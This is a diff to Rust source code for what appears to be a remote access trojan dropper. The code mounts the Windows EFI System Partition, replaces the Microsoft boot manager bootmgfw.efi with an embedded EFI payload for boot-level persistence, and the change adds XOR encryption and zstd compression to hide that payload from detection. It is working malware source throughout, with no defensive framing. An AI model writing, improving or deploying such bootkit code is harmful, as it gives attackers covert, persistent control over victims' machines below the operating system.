@@ -1,10 +1,9 @@
 use std::ffi::c_void;
-use std::io::Write;
 use std::path::PathBuf;
-use std::{fs, ptr};
+use std::{fs, io, ptr};
 
 use rat_common::utils::DropGuard;
-use rat_dropper::{EFI_APPLICATION, ESP_GUID};
+use rat_dropper::{EFI_APPLICATION_ENCRYPTED, EFI_APPLICATION_KEY, ESP_GUID};
 use windows_sys::Win32::Foundation::{
     CloseHandle, ERROR_NO_MORE_FILES, ERROR_SUCCESS, GetLastError, HANDLE, INVALID_HANDLE_VALUE,
     LUID, MAX_PATH,
@@ -25,6 +24,19 @@ use windows_sys::Win32::System::Threading::{GetCurrentProcess, OpenProcessToken}
 use windows_sys::Win32::System::WindowsProgramming::GetFirmwareEnvironmentVariableW;
 use windows_sys::core::GUID;
 use windows_sys::w;
+
+fn write_decrypted_payload(f: &mut fs::File) -> io::Result<()> {
+    let decompressed = EFI_APPLICATION_ENCRYPTED
+        .iter()
+        .zip(EFI_APPLICATION_KEY.iter().cycle())
+        .map(|(&c, &k)| c ^ k)
+        .collect::<Vec<u8>>();
+
+    let mut decompressor = zstd::Decoder::new(decompressed.as_slice())?;
+    io::copy(&mut decompressor, f)?;
+
+    Ok(())
+}
 
 fn adjust_privileges() -> bool {
     let mut token = HANDLE::default();
@@ -186,6 +198,16 @@ fn mount_esp_and_setup_persistence() -> bool {
             }
 
             println!("Mounted ESP to S:\\");
+            let guard2 = DropGuard::new((), |_| {
+                let status = unsafe { DeleteVolumeMountPointW(w!("S:\\")) };
+
+                if status == 0 {
+                    let error = unsafe { GetLastError() };
+                    eprintln!("DeleteVolumeMountPointW error: 0x{error:X} ({error})");
+                } else {
+                    println!("Unmounted ESP from S:\\");
+                }
+            });
 
             let bootdir = PathBuf::from("S:\\EFI\\Microsoft\\Boot");
             let bootmgfw_old = bootdir.join("bootmgfw_old.efi");
@@ -200,7 +222,7 @@ fn mount_esp_and_setup_persistence() -> bool {
 
             match fs::File::create(&bootmgfw) {
                 Ok(mut f) => {
-                    if let Err(e) = f.write_all(EFI_APPLICATION) {
+                    if let Err(e) = write_decrypted_payload(&mut f) {
                         eprintln!("Failed to write EFI application to bootmgfw.efi: {e}");
                         drop(f);
 
@@ -216,17 +238,6 @@ fn mount_esp_and_setup_persistence() -> bool {
                     return false;
                 }
             }
-
-            let guard2 = DropGuard::new((), |_| {
-                let status = unsafe { DeleteVolumeMountPointW(w!("S:\\")) };
-
-                if status == 0 {
-                    let error = unsafe { GetLastError() };
-                    eprintln!("DeleteVolumeMountPointW error: 0x{error:X} ({error})");
-                } else {
-                    println!("Unmounted ESP from S:\\");
-                }
-            });
 
             drop(guard2);
             return true;
